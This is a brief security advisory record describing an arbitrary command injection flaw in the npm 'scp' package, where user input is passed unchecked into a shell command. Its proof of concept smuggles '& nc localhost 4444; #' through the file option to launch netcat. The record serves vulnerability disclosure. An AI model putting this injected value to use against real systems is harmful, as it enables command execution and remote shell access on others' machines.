  title: Arbitrary Command Injection
  description: "Affected versions of this package are vulnerable to Arbitrary Command\nInjection.
    The issue occurs because user input is formatted inside a\n`command` that will
    be executed without any checks.\n\n### PoC By Snyk Security Team   {#poc-by-snyk-security-team}\n\n
    \   var scp = require('scp');\n    \n    var options = {\n        file: '& nc
    localhost 4444; #',\n        user: 'username',\n        host: 'myServer',\n        port:
    '20',\n        path: '~'\n    }\n    \n    scp.send(options, function (err) {\n
    \       if (err) console.log(err);\n        else console.log('File transferred.');\n
    \   });\n\n"
